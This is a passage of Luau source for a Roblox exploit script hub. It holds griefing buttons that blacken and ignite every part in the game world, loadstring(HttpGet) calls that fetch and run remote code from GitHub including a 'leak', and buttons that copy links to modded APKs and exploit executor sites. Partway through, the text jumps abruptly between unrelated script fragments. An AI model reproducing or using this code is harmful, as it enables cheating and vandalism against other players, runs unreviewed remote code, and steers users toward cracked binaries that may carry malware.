e1x1x1x1Music.Text = "1x1x1x1 Music"
e1x1x1x1Music.TextColor3 = Color3.fromRGB(0, 0, 0)
e1x1x1x1Music.TextScaled = true
e1x1x1x1Music.TextSize = 14.000
e1x1x1x1Music.TextWrapped = true
e1x1x1x1Music.MouseButton1Down:connect(function()
	--Made by Servano

	local s = Instance.new("Sound")

	s.Name = "Sound"
	s.SoundId = "http://www.roblox.com/asset/?id=27697743"
	s.Volume = 1
	s.Pitch = 3
	s.Looped = true
	s.archivable = false

	s.Parent = game.Workspace

	wait(1)

	s:play()
end)
e1x1x1x1Laugh.Name = "e1x1x1x1Laugh"
e1x1x1x1Laugh.Parent = Frame
e1x1x1x1Laugh.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
e1x1x1x1Laugh.Position = UDim2.new(0.0714285746, 0, 0.648000002, 0)
e1x1x1x1Laugh.Size = UDim2.new(0, 79, 0, 34)
e1x1x1x1Laugh.Font = Enum.Font.GothamBold
e1x1x1x1Laugh.Text = "1x1x1x1 Laugh"
e1x1x1x1Laugh.TextColor3 = Color3.fromRGB(0, 0, 0)
e1x1x1x1Laugh.TextScaled = true
e1x1x1x1Laugh.TextSize = 14.000
e1x1x1x1Laugh.TextWrapped = true
e1x1x1x1Laugh.MouseButton1Down:connect(function()
	--Made by Servano

	local s = Instance.new("Sound")

	s.Name = "Sound"
	s.SoundId = "http://www.roblox.com/asset/?id=35935204"
	s.Volume = 1
	s.Pitch = 0.9
	s.Looped = true
	s.archivable = false

	s.Parent = game.Workspace

	wait(1)

	s:play()
end)
DayToNight.Name = "DayToNight"
DayToNight.Parent = Frame
DayToNight.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
DayToNight.Position = UDim2.new(0.388888896, 0, 0.216000006, 0)
DayToNight.Size = UDim2.new(0, 83, 0, 31)
DayToNight.Font = Enum.Font.GothamBold
DayToNight.Text = "Night"
DayToNight.TextColor3 = Color3.fromRGB(0, 0, 0)
DayToNight.TextScaled = true
DayToNight.TextSize = 14.000
DayToNight.TextWrapped = true
DayToNight.MouseButton1Down:connect(function()
	while true do 
		print ("Loop cycle start")
		game.Lighting.TimeOfDay = "18:00:00"
		wait(0.5)
	end
end)
e666.Name = "e666"
e666.Parent = Frame
e666.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
e666.Position = UDim2.new(0.388888896, 0, 0.43599999, 0)
e666.Size = UDim2.new(0, 83, 0, 31)
e666.Font = Enum.Font.GothamBold
e666.Text = "666"
e666.TextColor3 = Color3.fromRGB(0, 0, 0)
e666.TextScaled = true
e666.TextSize = 14.000
e666.TextWrapped = true
e666.MouseButton1Down:connect(function()
	for i,v in next,workspace:children''do
		if(v:IsA'BasePart')then
			me=v;
			bbg=Instance.new('BillboardGui',me);
			bbg.Name='stuf';
			bbg.Adornee=me;
			bbg.Size=UDim2.new(2.5,0,2.5,0)
			--bbg.StudsOffset=Vector3.new(0,2,0)
			tlb=Instance.new'TextLabel';
			tlb.Text='666 666 666 666 666 666';
			tlb.Font='SourceSansBold';
			tlb.FontSize='Size48';
			tlb.TextColor3=Color3.new(1,0,0);
			tlb.Size=UDim2.new(1.25,0,1.25,0);
			tlb.Position=UDim2.new(-0.125,-22,-1.1,0);
			tlb.BackgroundTransparency=1;
			tlb.Parent=bbg;
		end;end;
	function xds(dd)
		for i,v in next,dd:children''do
			if(v:IsA'BasePart')then
				v.BrickColor=BrickColor.new'Really black';
				v.TopSurface='Smooth';
				v.BottomSurface='Smooth';
				s=Instance.new('SelectionBox',v);
				s.Adornee=v;
				s.Color=BrickColor.new'Really red';
				a=Instance.new('PointLight',v);
				a.Color=Color3.new(1,0,0);
				a.Range=15;
				a.Brightness=5;
				f=Instance.new('Fire',v);
				f.Size=19;
				f.Heat=22;
			end;
			game.Lighting.TimeOfDay=0;
			game.Lighting.Brightness=0;
			game.Lighting.ShadowColor=Color3.new(0,0,0);
			game.Lighting.Ambient=Color3.new(1,0,0);
			game.Lighting.FogEnd=200;
			game.Lighting.FogColor=Color3.new(0,0,0);
			local dec = 'http://www.roblox.com/asset/?id=19399245';
			local fac = {'Front', 'Back', 'Left', 'Right', 'Top', 'Bottom'}
			--coroutine.wrap(function()
			--for ,_ in pairs(fac) do
			--local ddec = Instance.new("Decal", v)
			--ddec.Face = 
			--ddec.Texture = dec
			--end end)()
			if #(v:GetChildren())>0 then
				xds(v) 
			end
		end
	end
	xds(game.Workspace)
end)
EpicSaxGuy.Name = "EpicSaxGuy"
EpicSaxGuy.Parent = Frame
EpicSaxGuy.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
EpicSaxGuy.Position = UDim2.new(0.388888896, 0, 0.648000002, 0)
EpicSaxGuy.Size = UDim2.new(0, 83, 0, 34)
EpicSaxGuy.Font = Enum.Font.GothamBold
EpicSaxGuy.Text = "Epic Sax Guy"
EpicSaxGuy.TextColor3 = Color3.fromRGB(0, 0, 0)
EpicSaxGuy.TextScaled = true
EpicSaxGuy.TextSize = 14.000
EpicSaxGuy.TextWrapped = true
EpicSaxGuy.MouseButton1Down:connect(function()
	--Made by Servano

	local s = Instance.new("Sound")

	s.Name = "Sound"
	s.SoundId = "http://www.roblox.com/asset/?id=358776516"
	s.Volume = 1
	s.Pitch = 1
	s.Looped = true
	s.archivable = false

	s.Parent = game.Workspace

	wait(1)

	s:play()
end)
Disc0.Name = "Disc0"
Disc0.Parent = Frame
Disc0.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Disc0.Position = UDim2.new(0.693121672, 0, 0.216000006, 0)
Disc0.Size = UDim2.new(0, 89, 0, 31)
Disc0.Font = Enum.Font.GothamBold
Disc0.Text = "Disco"
Disc0.TextColor3 = Color3.fromRGB(0, 0, 0)
Disc0.TextScaled = true
Disc0.TextSize = 14.000
Disc0.TextWrapped = true
Disc0.MouseButton1Down:connect(function()
	while true do

		game.Lighting.Ambient = Color3.new(math.random(), math.random(), math.random())
		wait(.25)

	end
end)
e2006Theme.Name = "e2006Theme"
e2006Theme.Parent = Frame
e2006Theme.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
e2006Theme.Position = UDim2.new(0.693121672, 0, 0.43599999, 0)
e2006Theme.Size = UDim2.new(0, 89, 0, 31)
e2006Theme.Font = Enum.Font.GothamBold
e2006Theme.Text = "2006 Music"
e2006Theme.TextColor3 = Color3.fromRGB(0, 0, 0)
e2006Theme.TextScaled = true
e2006Theme.TextSize = 14.000
e2006Theme.TextWrapped = true
e2006Theme.MouseButton1Down:connect(function()
	--Made by Servano

	local s = Instance.new("Sound")

	s.Name = "Sound"
	s.SoundId = "http://www.roblox.com/asset/?id=1987072964"
	s.Volume = 1
	s.Pitch = 1
	s.Looped = true
	s.archivable = false

	s.Parent = game.Workspace

	wait(1)

	s:play()
end)
ForceField.Name = "ForceField"
ForceField.Parent = Frame
ForceField.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
ForceField.Position = UDim2.new(0.693121672, 0, 0.648000002, 0)
ForceField.Size = UDim2.new(0, 89, 0, 34)
ForceField.Font = Enum.Font.GothamBold
ForceField.Text = "FF"
ForceField.TextColor3 = Color3.fromRGB(0, 0, 0)
ForceField.TextScaled = true
ForceField.TextSize = 14.000
ForceField.TextWrapped = true
ForceField.MouseButton1Down:connect(function()
	-- Gui to Lua
	-- Version: 3.
	-- Instances:

	local ForceFieldGUI = Instance.new("ScreenGui")
	local ForceFieldGUI_2 = Instance.new("TextButton")
	local ForceFieldOFF = Instance.new("TextButton")
	local ForceFieldON = Instance.new("TextButton")

	--Properties:

	ForceFieldGUI.Name = "ForceFieldGUI"
	ForceFieldGUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

	ForceFieldGUI_2.Name = "ForceFieldGUI"
	ForceFieldGUI_2.Parent = ForceFieldGUI
	ForceFieldGUI_2.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
	ForceFieldGUI_2.BackgroundTransparency = 0.300
	ForceFieldGUI_2.BorderColor3 = Color3.fromRGB(245, 244, 247)
	ForceFieldGUI_2.BorderSizePixel = 0
	ForceFieldGUI_2.Position = UDim2.new(0, 0, 0, 240)
	ForceFieldGUI_2.Size = UDim2.new(0, 100, 0, 20)
	ForceFieldGUI_2.Text = "ForceField"
	ForceFieldGUI_2.TextColor3 = Color3.fromRGB(17, 17, 17)
	ForceFieldGUI_2.TextTransparency = 0.300

	ForceFieldOFF.Name = "ForceFieldOFF"
	ForceFieldOFF.Parent = ForceFieldGUI
	ForceFieldOFF.BackgroundColor3 = Color3.fromRGB(253, 253, 253)
	ForceFieldOFF.BackgroundTransparency = 0.300
	ForceFieldOFF.BorderColor3 = Color3.fromRGB(245, 244, 247)
	ForceFieldOFF.BorderSizePixel = 0
	ForceFieldOFF.Position = UDim2.new(0, 0, 0, 280)
	ForceFieldOFF.Size = UDim2.new(0, 100, 0, 20)
	ForceFieldOFF.Visible = false
	ForceFieldOFF.Text = "Off"
	ForceFieldOFF.TextColor3 = Color3.fromRGB(17, 17, 17)

	ForceFieldON.Name = "ForceFieldON"
	ForceFieldON.Parent = ForceFieldGUI
	ForceFieldON.BackgroundColor3 = Color3.fromRGB(253, 253, 253)
	ForceFieldON.BackgroundTransparency = 0.300
	ForceFieldON.BorderColor3 = Color3.fromRGB(245, 244, 247)
	ForceFieldON.BorderSizePixel = 0
	ForceFieldON.Position = UDim2.new(0, 0, 0, 260)
	ForceFieldON.Size = UDim2.new(0, 100, 0, 20)
	ForceFieldON.Visible = false
	ForceFieldON.Text = "On"
	ForceFieldON.TextColor3 = Color3.fromRGB(17, 17, 17)

	-- Scripts:

	local function DVAWVL_fake_script() -- ForceFieldGUI_2.Script 
		local script = Instance.new('Script', ForceFieldGUI_2)

		function onClicked(GUI)
			h = script.Parent.Parent.Parent.Parent.Character:findFirstChild("Humanoid")
			if (h ~= nil) then
				script.Parent.Parent.ForceFieldOFF.Visible = true
				script.Parent.Parent.ForceFieldON.Visible = true
			else return end
		end
		script.Parent.MouseButton1Click:connect(onClicked)
	end
	coroutine.wrap(DVAWVL_fake_script)()
	local function HYECSMJ_fake_script() -- ForceFieldOFF.Script 
		local script = Instance.new('Script', ForceFieldOFF)

		function onClicked(GUI)
			f = script.Parent.Parent.Parent.Parent.Character:findFirstChild("ForceField")
			if (f ~= nil) then
				f:remove()
			else return end
		end
		script.Parent.MouseButton1Click:connect(onClicked)
	end
	coroutine.wrap(HYECSMJ_fake_script)()
	local function LOYRXPU_fake_script() -- ForceFieldOFF.Script 
		local script = Instance.new('Script', ForceFieldOFF)

		function onClicked(GUI)
			h = script.Parent.Parent.Parent.Parent.Character:findFirstChild("Humanoid")
			if (h ~= nil) then
				script.Parent.Parent.ForceFieldOFF.Visible = false
				script.Parent.Parent.ForceFieldON.Visible = false
			else return end
		end
		script.Parent.MouseButton1Click:connect(onClicked)
	end
	coroutine.wrap(LOYRXPU_fake_script)()
	local function PFEVNBW_fake_script() -- ForceFieldON.Script 
		local script = Instance.new('Script', ForceFieldON)

		function onClicked(GUI)
			h = script.Parent.Parent.Parent.Parent.Character:findFirstChild("Humanoid")
			if (h ~= nil) then
				FF = Instance.new("ForceField")
				FF.Parent = script.Parent.Parent.Parent.Parent.Character
			else return end
		end
		script.Parent.MouseButton1Click:connect(onClicked)
	end
	coroutine.wrap(PFEVNBW_fake_script)()
	local function FNHQ_fake_script() -- ForceFieldON.Script 
		local script = Instance.new('Script', ForceFieldON)

		function onClicked(GUI)
			h = script.Parent.Parent.Parent.Parent.Character:findFirstChild("Humanoid")
			if (h ~= nil) then
				script.Parent.Parent.ForceFieldOFF.Visible = false
				script.Parent.Parent.ForceFieldON.Visible = false
			else return end
		end
		script.Parent.MouseButton1Click:connect(onClicked)
	end
	coroutine.wrap(FNHQ_fake_script)()
end)
-- Scripts:

local function QFCS_fake_script() -- Frame.Dragify 
	local script = Instance.new('LocalScript', Frame)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	
	dragify(script.Parent)
end
coroutine.wrap(QFCS_fake_script)()
      		print("button pressed")
  	end    
})

Tab37:AddButton({
	Name = "g00byGui V8 ( leak )",
	Callback = function()
	 loadstring(game:HttpGet("https://raw.githubusercontent.com/ZhenX201/Admin/main/source"))()
      		print("button pressed")
  	end    
})

Tab37:AddButton({
	Name = "spiderman ( FE )",
	Callback = function()
	 loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/SpooderMan-FE/main/SpoooderMan%20FE%20V2"))();
      		print("button pressed")
  	end    
})

local Tab38 = Window:MakeTab({
	Name = "Mod Menu Links",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab38:AddButton({
	Name = "Dan The Man (Mod Menu)",
	Callback = function()
	 setclipboard("https://www.mediafire.com/file/fdrh25ae0ebxgmp/Dan_The_Man_1.11.60.apk/file")
      		print("button pressed")
  	end    
})

Tab38:AddButton({
	Name = "Granny (Mod Menu)",
	Callback = function()
	 setclipboard("https://www.mediafire.com/file/e2p4wc252riw26g/G1_1.8%2528CiberMod%2529%255BForMyChannel%255D.apk/file")
      		print("button pressed")
  	end    
})

Tab38:AddButton({
	Name = "Among Us (Mod Menu)",
	Callback = function()
	 setclipboard("https://www.mediafire.com/file/ws0x0lyl6nsw4cb/Among+Us+Mod+u.apk/file")
      		print("button pressed")
  	end    
})

Tab38:AddButton({
	Name = "SFG2 15Mods (Mod Menu)",
	Callback = function()
	 setclipboard("Apk : https://www.mediafire.com/file/68mo264rd3ux4y0/15+v+1.apk/file / obb : https://www.mediafire.com/file/lmyrcf04n3pxdhi/main.97.com.ForgeGames.SpecialForcesGroup2.obb/ffiles") 
      		print("button pressed")
  	end    
})

Tab38:AddButton({
	Name = "SFG2 9mods (Mod Menu)",
	Callback = function()
	 setclipboard("APK : https://www.mediafire.com/download/fyvw3omfjk3h3jq / Obb : https://www.mediafire.com/download/65xw7it63lkfmvv")
      		print("button pressed")
  	end    
})

Tab38:AddButton({
	Name = "SFG2 4mods (Mod menu)",
	Callback = function()
	 setclipboard("Obb : https://www.mediafire.com/download/umuie5iog94annf / APK : Search 4mod SFG2 in Youtube")
      		print("button pressed")
  	end    
})

Tab:AddButton({
	Name = "SFG2 2mods (Mod Menu)",
	Callback = function()
setclipboard("APK : https://www.mediafire.com/file/mdhkq7cwd1mysap/Daisy-Chinese-Combined.apk/file / Obb : https://www.mediafire.com/file/8evgx377iidi3g3/OBB_For_V4.2_%2528By_DeerGazz%2529.zip/file")
      		print("button pressed")
  	end    
})

Tab38:AddButton({
	Name = "ill add more soon...",
	Callback = function()
	 -- Script Here! 
      		print("button pressed")
  	end    
})

local Tab39 = Window:MakeTab({
	Name = "EXECUTOR DOWNLOAD",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab39:AddButton({
	Name = "Delta 2.0",
	Callback = function()
	 setclipboard("https://deltaexploits.net/") 
      		print("button pressed")
  	end    
})

Tab39:AddButton({
	Name = "codex",
	Callback = function()
	 setclipboard("https://codex.lol/") 
      		print("button pressed")
  	end    
})

Tab39:AddButton({
	Name = "Vega X",
	Callback = function()
	 setclipboard("https://vegax.gg/")
      		print("button pressed")
  	end    
})

Tab39:AddButton({
	Name = "Wave",
	Callback = function()
	 setclipboard("https://getwave.gg/")
      		print("button pressed")
  	end    
})

Tab39:AddButton({
	Name = "Arceus X",
	Callback = function()
	 setclipboard("https://spdmteam.com/") 
      		print("button pressed")
  	end    
})

Tab39:AddButton({
	Name = "Hydrogen",
	Callback = function()
	 setclipboard("https://hydrogen.sh/")
      		print("button pressed")
  	end    
})

Tab39:AddButton({
	Name = "Fluxus",
	Callback = function()
	 setclipboard("https://fluxteam.net/")
      		print("button pressed")
  	end    
})

Tab39:AddButton({
	Name = "Discord : gearv4_ / Dm Me If you have More!",
	Callback = function()
	 -- Script Here! 
      		print("button pressed")
  	end    
})

local Tab40 = Window:MakeTab({
	Name = "Mod Menu Websites",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab40:AddButton({
	Name = "HappyMod",
	Callback = function()
	 setclipboard("https://happymod.com/")
      		print("button pressed")
  	end    
})

Tab40:AddButton({
	Name = "An1",
	Callback = function()
	 setclipboard("https://an1.com/") 
      		print("button pressed")
  	end    
})

Tab40:AddButton({
	Name = "Playmods",
	Callback = function()
	 setclipboard("https://playmods.net/")
      		print("button pressed")
  	end    
})

Tab40:AddButton({
	Name = "Mod Yolo",
	Callback = function()
	 setclipboard("https://modyolo.com/")
      		print("button pressed")
  	end    
})

Tab40:AddButton({
	Name = "Credits To The Website Owners",
	Callback = function()
	 -- Script Here! 
      		print("button pressed")
  	end    
})

local Tab41 = Window:MakeTab({
	Name = "Credit Section",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab41:AddButton({
	Name = "Owner : GEARV4",
	Callback = function()
	 -- Script Here! 
      		print("button pressed")
  	end    
})

Tab41:AddButton({
	Name = "Co-Owner : EpikGGHubz",
	Callback = function()
	 -- Script Here! 
      		print("button pressed")
  	end    
})

Tab41:AddButton({
	Name = "Server Owner : 4.04",
	Callback = function()
	 -- Script Here! 
      		print("button pressed")
  	end    
})

Tab41:AddButton({
	Name = "Language Used : Lua / Luau",
	Callback = function()
	 -- Script Here! 
      		print("button pressed")
  	end    
})

Tab41:AddButton({
	Name = "Credits To The Owners of the scripthubs",
	Callback = function()
	 -- Script Here! 
      		print("button pressed")
  	end    
})

Tab41:AddButton({
	Name = "Searcher Used : ScriptBlox",
	Callback = function()
	 -- Script Here! 
      		print("button pressed")
  	end    
})

Tab41:AddButton({
	Name = "Codepad Used : Acode",
	Callback = function()
	 -- Script Here! 
      		print("button pressed")
  	end    
})

local Tab42 = Window:MakeTab({
	Name = "Script Status",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab42:AddButton({
	Name = "Scripts Working : 95%",
	Callback = function()
	 -- Script Here! 
      		print("button pressed")
  	end    
})

Tab42:AddButton({
	Name = "Script Patch : 5%",
	Callback = function()
	 -- Script Here! 
      		print("button pressed")
  	end    
})

Tab42:AddButton({
	Name = "Added 59 More Diffrent Scripts",
	Callback = function()
	 -- Script Here! 
      		print("button pressed")
  	end    
})

Tab42:AddButton({
	Name = "Added 5 more Executors and Fixed 3 executors Bugs",
	Callback = function()
	 -- Script Here! 
      		print("button pressed")
  	end    
})

Tab42:AddButton({
	Name = "Now Supports Beta Executors",
	Callback = function()
	 -- Script Here! 
      		print("button pressed")
  	end    
})

Tab41:AddButton({
	Name = "Script Total Line : 15k+",
	Callback = function()
	 -- Script Here! 
      		print("button pressed")
  	end    
})

Tab42:AddButton({
	Name = "ALL BUGS FIXED",
	Callback = function()
	 -- Script Here! 
      		print("button pressed")
  	end    
})
